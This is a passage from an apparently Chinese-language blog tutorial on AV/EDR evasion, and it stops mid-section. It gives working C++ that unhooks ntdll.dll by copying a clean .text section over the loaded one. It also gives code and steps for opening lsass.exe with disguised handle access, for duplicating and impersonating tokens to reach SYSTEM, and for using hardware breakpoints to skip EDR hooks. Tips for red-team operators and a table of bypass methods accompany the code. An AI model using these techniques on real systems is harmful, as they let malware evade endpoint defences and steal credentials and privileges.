<td><strong>内联钩子</strong></td>
<td>覆盖函数开始的字节，跳转到处理程序。</td>
</tr>
<tr>
<td><strong>IAT 钩子</strong></td>
<td>更改模块导入地址表的条目，指向伪造函数。</td>
</tr>
<tr>
<td><strong>VEH 钩子</strong></td>
<td>使用向量化异常处理程序拦截执行。</td>
</tr>
<tr>
<td><strong>页面保护钩子</strong></td>
<td>使用 PAGE_GUARD 内存保护拦截函数访问。</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-检测内联钩子"><a href="#2-检测内联钩子" class="headerlink" title="2. 检测内联钩子"></a>2. 检测内联钩子</h3><h3 id="示例：比较内存中的-NTDLL-与磁盘中的-NTDLL"><a href="#示例：比较内存中的-NTDLL-与磁盘中的-NTDLL" class="headerlink" title="示例：比较内存中的 NTDLL 与磁盘中的 NTDLL"></a>示例：比较内存中的 NTDLL 与磁盘中的 NTDLL</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsFunctionHooked</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* functionName)</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    BYTE* inMemory = (BYTE*)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, functionName);<br><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;C:\\Windows\\System32\\ntdll.dll&quot;</span>, GENERIC_READ,<br>        FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HANDLE hMapping = <span class="hljs-built_in">CreateFileMapping</span>(hFile, <span class="hljs-literal">NULL</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    BYTE* mappedDll = (BYTE*)<span class="hljs-built_in">MapViewOfFile</span>(hMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mappedDll;<br>    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(mappedDll + dos-&gt;e_lfanew);<br><br>    DWORD rva = (DWORD)((ULONG_PTR)inMemory - (ULONG_PTR)hNtdll);<br>    BYTE* onDisk = mappedDll + rva;<br><br>    <span class="hljs-type">bool</span> hooked = <span class="hljs-built_in">memcmp</span>(inMemory, onDisk, <span class="hljs-number">16</span>) != <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(mappedDll);<br>    <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br>    <span class="hljs-keyword">return</span> hooked;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该技术通过比较内存中的函数与磁盘上的版本来检测篡改。</p>
<hr>
<h3 id="3-检测-IAT-钩子"><a href="#3-检测-IAT-钩子" class="headerlink" title="3. 检测 IAT 钩子"></a>3. 检测 IAT 钩子</h3><p>你可以解析当前进程的 IAT，验证是否有指针指向意外的模块：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ScanIATHooks</span><span class="hljs-params">(HMODULE hModule)</span> </span>&#123;<br>    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hModule;<br>    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dos-&gt;e_lfanew);<br>    IMAGE_IMPORT_DESCRIPTOR* imports = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hModule +<br>        nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<br><br>    <span class="hljs-keyword">for</span> (; imports-&gt;Name; imports++) &#123;<br>        <span class="hljs-type">char</span>* dllName = (<span class="hljs-type">char</span>*)((BYTE*)hModule + imports-&gt;Name);<br>        HMODULE imported = <span class="hljs-built_in">GetModuleHandleA</span>(dllName);<br><br>        IMAGE_THUNK_DATA* origFirstThunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + imports-&gt;OriginalFirstThunk);<br>        IMAGE_THUNK_DATA* firstThunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + imports-&gt;FirstThunk);<br><br>        <span class="hljs-keyword">while</span> (origFirstThunk-&gt;u1.AddressOfData) &#123;<br>            FARPROC* funcPtr = (FARPROC*)&amp;firstThunk-&gt;u1.Function;<br>            <span class="hljs-keyword">if</span> ((ULONG_PTR)(*funcPtr) &lt; (ULONG_PTR)imported ||<br>                (ULONG_PTR)(*funcPtr) &gt; ((ULONG_PTR)imported + <span class="hljs-number">0x100000</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] IAT Hook detected: %s\n&quot;</span>, dllName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            origFirstThunk++;<br>            firstThunk++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-绕过钩子"><a href="#4-绕过钩子" class="headerlink" title="4. 绕过钩子"></a>4. 绕过钩子</h3><h3 id="选项-1-–-手动系统调用（不使用-NTDLL-函数）"><a href="#选项-1-–-手动系统调用（不使用-NTDLL-函数）" class="headerlink" title="选项 1 – 手动系统调用（不使用 NTDLL 函数）"></a>选项 1 – 手动系统调用（不使用 NTDLL 函数）</h3><ul>
<li><p>手动重新实现敏感的系统调用，如 <code>NtWriteVirtualMemory</code>（参见 8.6）。</p>
</li>
<li><p>绕过所有用户模式钩子。</p>
</li>
</ul>
<h3 id="选项-2-–-从磁盘恢复-NTDLL"><a href="#选项-2-–-从磁盘恢复-NTDLL" class="headerlink" title="选项 2 – 从磁盘恢复 NTDLL"></a>选项 2 – 从磁盘恢复 NTDLL</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UnhookNtdll</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> sysPath[MAX_PATH];<br>    <span class="hljs-built_in">GetSystemDirectoryA</span>(sysPath, MAX_PATH);<br>    <span class="hljs-built_in">strcat_s</span>(sysPath, <span class="hljs-string">&quot;\\ntdll.dll&quot;</span>);<br><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(sysPath, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    HANDLE hMapping = <span class="hljs-built_in">CreateFileMapping</span>(hFile, <span class="hljs-literal">NULL</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    BYTE* cleanNtdll = (BYTE*)<span class="hljs-built_in">MapViewOfFile</span>(hMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)cleanNtdll;<br>    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(cleanNtdll + dos-&gt;e_lfanew);<br>    IMAGE_SECTION_HEADER* sec = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(nt);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(sec[i].Name, <span class="hljs-string">&quot;.text&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            DWORD oldProtect;<br>            <span class="hljs-built_in">VirtualProtect</span>((LPVOID)((BYTE*)hNtdll + sec[i].VirtualAddress),<br>                sec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br>            <span class="hljs-built_in">memcpy</span>((LPVOID)((BYTE*)hNtdll + sec[i].VirtualAddress),<br>                cleanNtdll + sec[i].PointerToRawData,<br>                sec[i].Misc.VirtualSize);<br>            <span class="hljs-built_in">VirtualProtect</span>((LPVOID)((BYTE*)hNtdll + sec[i].VirtualAddress),<br>                sec[i].Misc.VirtualSize, oldProtect, &amp;oldProtect);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(cleanNtdll);<br>    <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-高级绕过"><a href="#5-高级绕过" class="headerlink" title="5. 高级绕过"></a>5. 高级绕过</h3><ul>
<li><p><strong>将 NTDLL 映射到新的内存区域</strong>（例如通过 <code>NtCreateSection</code>），并从中执行。</p>
</li>
<li><p><strong>手动 PE 加载器</strong>：不通过 Windows 加载器加载 <code>ntdll.dll</code>，手动解析地址。</p>
</li>
<li><p><strong>间接系统调用</strong>：通过 RWX 内存区域跳转或使用栈枢轴。</p>
</li>
<li><p><strong>使用 TEB 或直接指针链</strong> 来解析系统调用存根。</p>
</li>
</ul>
<hr>
<h3 id="真实世界使用"><a href="#真实世界使用" class="headerlink" title="真实世界使用"></a>真实世界使用</h3><ol>
<li><p><strong>Mimikatz</strong> 动态卸载 <code>ntdll.dll</code>，避免 EDR 监控并转储 LSASS。</p>
</li>
<li><p><strong>Cobalt Strike Beacon</strong> 使用直接系统调用或存根加载器绕过 EDR 日志。</p>
</li>
<li><p><strong>EDR 绕过框架</strong> 如 <strong>ScyllaHide</strong>、<strong>SysWhispers</strong> 和 <strong>SleepyKittens</strong> 在此原理上构建。</p>
</li>
</ol>
<h2 id="AV-EDR-规避实战技巧-8-8-句柄欺骗与访问令牌操控"><a href="#AV-EDR-规避实战技巧-8-8-句柄欺骗与访问令牌操控" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.8 - 句柄欺骗与访问令牌操控"></a>AV&#x2F;EDR 规避实战技巧 - 8.8 - 句柄欺骗与访问令牌操控</h2><h3 id="概述-10"><a href="#概述-10" class="headerlink" title="概述"></a>概述</h3><p>现代 EDR 使用 <strong>句柄检查</strong> 和 <strong>令牌追踪</strong> 来监视恶意行为。如果你的恶意软件打开了指向 <code>lsass.exe</code> 的句柄，例如，EDR 可能会立即标记该进程——即使你使用了隐蔽的系统调用。</p>
<p>为了绕过这些检测，攻击者使用 <strong>句柄欺骗</strong>、<strong>令牌复制</strong> 和 <strong>特权操控</strong> 技术来隐藏痕迹或获得提升的访问权限。</p>
<hr>
<h3 id="1-什么是句柄和令牌？"><a href="#1-什么是句柄和令牌？" class="headerlink" title="1. 什么是句柄和令牌？"></a>1. <strong>什么是句柄和令牌？</strong></h3><ul>
<li><p><strong>句柄</strong> 是指向内核对象（如进程、文件或注册表键）的引用，用户模式进程通过句柄与内核对象进行交互。</p>
</li>
<li><p><strong>访问令牌</strong> 定义了进程&#x2F;线程运行时的安全上下文（SID，特权等）。</p>
</li>
</ul>
<p>EDR 通常会：</p>
<ul>
<li><p>钩住 <code>NtOpenProcess</code> 或 <code>OpenProcess</code> 以监视对敏感进程（例如 LSASS）的访问。</p>
</li>
<li><p>跟踪复制的令牌，以检测特权提升或模拟。</p>
</li>
</ul>
<hr>
<h3 id="2-句柄欺骗"><a href="#2-句柄欺骗" class="headerlink" title="2. 句柄欺骗"></a>2. <strong>句柄欺骗</strong></h3><h3 id="目标：通过伪造句柄的访问掩码或来源，使指向-lsass-exe-的句柄看起来无害。"><a href="#目标：通过伪造句柄的访问掩码或来源，使指向-lsass-exe-的句柄看起来无害。" class="headerlink" title="目标：通过伪造句柄的访问掩码或来源，使指向 lsass.exe 的句柄看起来无害。"></a>目标：通过伪造句柄的访问掩码或来源，使指向 <code>lsass.exe</code> 的句柄看起来无害。</h3><h4 id="实际问题："><a href="#实际问题：" class="headerlink" title="实际问题："></a>实际问题：</h4><p><code>PROCESS_QUERY_INFORMATION</code> 通常是允许的，但 <code>PROCESS_VM_READ</code> 或 <code>PROCESS_ALL_ACCESS</code> 可能会触发 EDR 警报。</p>
<h3 id="示例：通过系统调用伪造句柄访问标志"><a href="#示例：通过系统调用伪造句柄访问标志" class="headerlink" title="示例：通过系统调用伪造句柄访问标志"></a>示例：通过系统调用伪造句柄访问标志</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">HANDLE <span class="hljs-title">OpenTargetProcess</span><span class="hljs-params">(DWORD pid)</span> </span>&#123;<br>    OBJECT_ATTRIBUTES objAttr = &#123; <span class="hljs-number">0</span> &#125;;<br>    CLIENT_ID clientId = &#123; <span class="hljs-number">0</span> &#125;;<br>    clientId.UniqueProcess = (PVOID)(ULONG_PTR)pid;<br>    clientId.UniqueThread = <span class="hljs-number">0</span>;<br><br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>    NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(&amp;hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &amp;objAttr, &amp;clientId);<br>    <span class="hljs-keyword">return</span> hProcess;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接下来，<strong>将句柄复制到不同的进程</strong>，或通过 <strong>间接 RWX 区域注入</strong> 以避免检测。</p>
<hr>
<h3 id="3-令牌窃取与模拟"><a href="#3-令牌窃取与模拟" class="headerlink" title="3. 令牌窃取与模拟"></a>3. <strong>令牌窃取与模拟</strong></h3><p>攻击者可以使用令牌操控技术提升特权或横向移动。</p>
<h3 id="技术：-3"><a href="#技术：-3" class="headerlink" title="技术："></a>技术：</h3><h4 id="a-DuplicateTokenEx"><a href="#a-DuplicateTokenEx" class="headerlink" title="a. DuplicateTokenEx"></a>a. <strong>DuplicateTokenEx</strong></h4><p>从模拟令牌创建一个新的主令牌。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">HANDLE <span class="hljs-title">GetSystemToken</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hToken;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_DUPLICATE | TOKEN_QUERY, &amp;hToken)) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    HANDLE hDupToken;<br>    <span class="hljs-built_in">DuplicateTokenEx</span>(hToken, TOKEN_ALL_ACCESS, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;hDupToken);<br>    <span class="hljs-keyword">return</span> hDupToken;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="b-ImpersonateLoggedOnUser"><a href="#b-ImpersonateLoggedOnUser" class="headerlink" title="b. ImpersonateLoggedOnUser"></a>b. <strong>ImpersonateLoggedOnUser</strong></h4><p>在盗取的令牌上下文中运行代码。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ImpersonateLoggedOnUser</span>(hDupToken);<br></code></pre></td></tr></table></figure>

<h4 id="c-SetThreadToken"><a href="#c-SetThreadToken" class="headerlink" title="c. SetThreadToken"></a>c. <strong>SetThreadToken</strong></h4><p>将令牌应用到线程，以实现临时提升。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">SetThreadToken</span>(<span class="hljs-literal">NULL</span>, hDupToken);<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-从-LSASS-中窃取-SYSTEM-令牌"><a href="#4-从-LSASS-中窃取-SYSTEM-令牌" class="headerlink" title="4. 从 LSASS 中窃取 SYSTEM 令牌"></a>4. <strong>从 LSASS 中窃取 SYSTEM 令牌</strong></h3><p>你可以枚举句柄并找到属于 SYSTEM 的令牌，然后模拟它。</p>
<h4 id="PoC-代码片段（使用-NtQuerySystemInformation）"><a href="#PoC-代码片段（使用-NtQuerySystemInformation）" class="headerlink" title="PoC 代码片段（使用 NtQuerySystemInformation）"></a>PoC 代码片段（使用 <code>NtQuerySystemInformation</code>）</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_SYSTEM_HANDLE</span> &#123;<br>    ULONG       ProcessId;<br>    BYTE        ObjectTypeNumber;<br>    BYTE        Flags;<br>    USHORT      Handle;<br>    PVOID       Object;<br>    ACCESS_MASK GrantedAccess;<br>&#125; SYSTEM_HANDLE;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">FindAndStealSystemToken</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 使用 NtQuerySystemInformation(SystemHandleInformation) 枚举句柄</span><br>    <span class="hljs-comment">// 找到属于 SYSTEM 的令牌（检查 SID）</span><br>    <span class="hljs-comment">// 使用 DuplicateHandle() 复制令牌</span><br>    <span class="hljs-comment">// 使用 ImpersonateLoggedOnUser() 或 SetThreadToken() 模拟</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>你必须验证令牌是否属于 SYSTEM 级进程，否则模拟会失败。</p>
<hr>
<h3 id="5-绕过-EDR-检测"><a href="#5-绕过-EDR-检测" class="headerlink" title="5. 绕过 EDR 检测"></a>5. <strong>绕过 EDR 检测</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>EDR 反应</th>
<th>绕过方法</th>
</tr>
</thead>
<tbody><tr>
<td>打开 <code>lsass.exe</code> 进程</td>
<td>被标记</td>
<td>使用直接系统调用，伪造句柄</td>
</tr>
<tr>
<td>使用 <code>AdjustTokenPrivileges</code></td>
<td>如果启用 <code>SeDebugPrivilege</code> 会被标记</td>
<td>在内存中补丁 API 或设置特权</td>
</tr>
<tr>
<td>创建远程线程</td>
<td>通过 ETW 监视</td>
<td>使用 RWX 内存，APC 或线程劫持</td>
</tr>
</tbody></table>
<hr>
<h3 id="6-高级概念"><a href="#6-高级概念" class="headerlink" title="6. 高级概念"></a>6. <strong>高级概念</strong></h3><h3 id="a-通过线程模拟进行令牌交换"><a href="#a-通过线程模拟进行令牌交换" class="headerlink" title="a. 通过线程模拟进行令牌交换"></a>a. <strong>通过线程模拟进行令牌交换</strong></h3><p>允许你短暂地提升上下文，而不影响整个进程。</p>
<h3 id="b-通过漏洞进行令牌提升"><a href="#b-通过漏洞进行令牌提升" class="headerlink" title="b. 通过漏洞进行令牌提升"></a>b. <strong>通过漏洞进行令牌提升</strong></h3><p>可以通过漏洞（例如 <code>PrintNightmare</code>，<code>CVE-2021-1732</code>）直接获取 SYSTEM 令牌。</p>
<h3 id="c-令牌隐匿"><a href="#c-令牌隐匿" class="headerlink" title="c. 令牌隐匿"></a>c. <strong>令牌隐匿</strong></h3><p>在内存中更改 <code>TokenUser</code> 字段（未公开）——高度规避，但如果使用不当可能导致崩溃。</p>
<hr>
<h3 id="7-实际使用"><a href="#7-实际使用" class="headerlink" title="7. 实际使用"></a>7. <strong>实际使用</strong></h3><ul>
<li><p><strong>Cobalt Strike</strong> 使用 <code>MakeToken</code> 和 <code>StealToken</code> 来模拟用户。</p>
</li>
<li><p><strong>Mimikatz</strong> 通过 <code>privilege::debug</code> 和 <code>token::elevate</code> 提供完整的令牌操控功能。</p>
</li>
<li><p><strong>SharpSploit</strong> 在 .NET 中通过 <code>LogonUser</code> + <code>DuplicateToken</code> 实现模拟和主令牌交换。</p>
</li>
</ul>
<hr>
<h3 id="8-红队操作员的建议"><a href="#8-红队操作员的建议" class="headerlink" title="8. 红队操作员的建议"></a>8. <strong>红队操作员的建议</strong></h3><ul>
<li><p>使用 <strong>直接系统调用</strong> 或从 shellcode 中调用 <code>NtOpenProcess</code> 以减少日志记录。</p>
</li>
<li><p><strong>伪造令牌或线程上下文</strong>，以运行像 <code>net use</code>、<code>PsExec</code> 或 <code>WMI</code> 之类的命令。</p>
</li>
<li><p>避免使用 **<code>CreateRemoteThread</code>**；偏好使用 APC 或 <code>NtQueueApcThread</code> 以提高隐蔽性。</p>
</li>
<li><p>考虑 <strong>间接令牌使用</strong>：注入到一个已经拥有所需权限的进程中。</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-8-9-使用硬件断点规避用户模式钩子"><a href="#AV-EDR-规避实战技巧-8-9-使用硬件断点规避用户模式钩子" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.9 - 使用硬件断点规避用户模式钩子"></a>AV&#x2F;EDR 规避实战技巧 - 8.9 - 使用硬件断点规避用户模式钩子</h2><h3 id="概述-11"><a href="#概述-11" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>大多数 EDR 和 AV 依赖于 <strong>用户模式 API 钩子</strong> 来拦截常见的 Windows API 函数。这些钩子通常包括：</p>
<ul>
<li><p><strong>内联钩子</strong>：通过修改像 <code>NtOpenProcess</code>、<code>ReadProcessMemory</code> 或 <code>NtProtectVirtualMemory</code> 等函数的前几个字节，将执行重定向到监控代码。</p>
</li>
<li><p><strong>IAT&#x2F;EAT 钩子</strong>：通过修改导入表中函数的地址来重定向 API 调用。</p>
</li>
</ul>
<p><strong>问题</strong>：如果恶意软件或红队者直接调用这些函数，执行会经过钩子，触发检测。</p>
<p><strong>解决方案</strong>：<strong>硬件断点</strong> 可以作为一种隐蔽且有效的方法，绕过或“跳过”被钩住的代码段——无需修改内存保护或通过标准的去钩方式引起怀疑。</p>
<hr>
<h3 id="1-什么是硬件断点？"><a href="#1-什么是硬件断点？" class="headerlink" title="1. 什么是硬件断点？"></a><strong>1. 什么是硬件断点？</strong></h3><p>硬件断点使用 CPU 的 <strong>调试寄存器（DR0–DR7）</strong> 来监控对特定内存地址的访问。它们具有以下特点：</p>
<ul>
<li><p>通过 <code>CONTEXT.DebugRegisters</code> 在 TEB 中设置。</p>
</li>
<li><p>对内存扫描器不可见（与修补或内存去钩不同）。</p>
</li>
<li><p>可以在 <strong>读取</strong>、<strong>写入</strong> 或 <strong>执行</strong> 访问时触发。</p>
</li>
</ul>
<hr>
<h3 id="2-核心概念-通过-HWBP-重定向执行"><a href="#2-核心概念-通过-HWBP-重定向执行" class="headerlink" title="2. 核心概念 - 通过 HWBP 重定向执行"></a><strong>2. 核心概念 - 通过 HWBP 重定向执行</strong></h3><p>如果 <code>NtReadVirtualMemory</code> 在用户模式下被钩住，可以不直接调用它：</p>
<ol>
<li><p>在钩子 <strong>之后</strong> 设置硬件断点。</p>
</li>
<li><p>触发执行（例如，使用 <code>int3</code> 或自定义代码）。</p>
</li>
<li><p>当断点被触发时，使用调试器的异常处理程序将 <strong>EIP&#x2F;RIP</strong> 重定向到钩子后的地址。</p>
</li>
<li><p>这样跳过整个被钩住的区域 <strong>无需去钩</strong> 或修补。</p>
</li>
</ol>
<hr>
<h3 id="3-实际用例"><a href="#3-实际用例" class="headerlink" title="3. 实际用例"></a><strong>3. 实际用例</strong></h3><ul>
<li><p>绕过 EDR 钩住 <code>NtWriteVirtualMemory</code> 和 <code>NtProtectVirtualMemory</code>，在 DLL 注入过程中。</p>
</li>
<li><p>在调用 <code>NtOpenProcess</code> 或 <code>NtQueryInformationProcess</code> 时，避免触发内联钩子。</p>
</li>
</ul>
<hr>
<h3 id="4-示例：通过硬件断点绕过钩子"><a href="#4-示例：通过硬件断点绕过钩子" class="headerlink" title="4. 示例：通过硬件断点绕过钩子"></a><strong>4. 示例：通过硬件断点绕过钩子</strong></h3><h3 id="步骤-1：手动解析系统调用存根"><a href="#步骤-1：手动解析系统调用存根" class="headerlink" title="步骤 1：手动解析系统调用存根"></a><strong>步骤 1：手动解析系统调用存根</strong></h3><p>假设 <code>NtOpenProcess</code> 被钩住：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">BYTE* pNtOpenProcess = (BYTE*)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtOpenProcess&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>我们分析函数，找到 <strong>钩子之后的地址</strong>，例如 +0x15 字节。</p>
<h3 id="步骤-2：安装硬件断点"><a href="#步骤-2：安装硬件断点" class="headerlink" title="步骤 2：安装硬件断点"></a><strong>步骤 2：安装硬件断点</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetHardwareBreakpoint</span><span class="hljs-params">(HANDLE hThread, <span class="hljs-type">void</span>* address)</span> </span>&#123;<br>    CONTEXT ctx = &#123;&#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><br>    <span class="hljs-built_in">SuspendThread</span>(hThread);<br>    <span class="hljs-built_in">GetThreadContext</span>(hThread, &amp;ctx);<br><br>    ctx.Dr0 = (DWORD_PTR)address;<br>    ctx.Dr7 |= <span class="hljs-number">1</span>;  <span class="hljs-comment">// 启用 DR0 本地断点</span><br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><br>    <span class="hljs-built_in">SetThreadContext</span>(hThread, &amp;ctx);<br>    <span class="hljs-built_in">ResumeThread</span>(hThread);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="步骤-3：异常时重定向执行"><a href="#步骤-3：异常时重定向执行" class="headerlink" title="步骤 3：异常时重定向执行"></a><strong>步骤 3：异常时重定向执行</strong></h3><p>在你的向量异常处理程序中：</p>
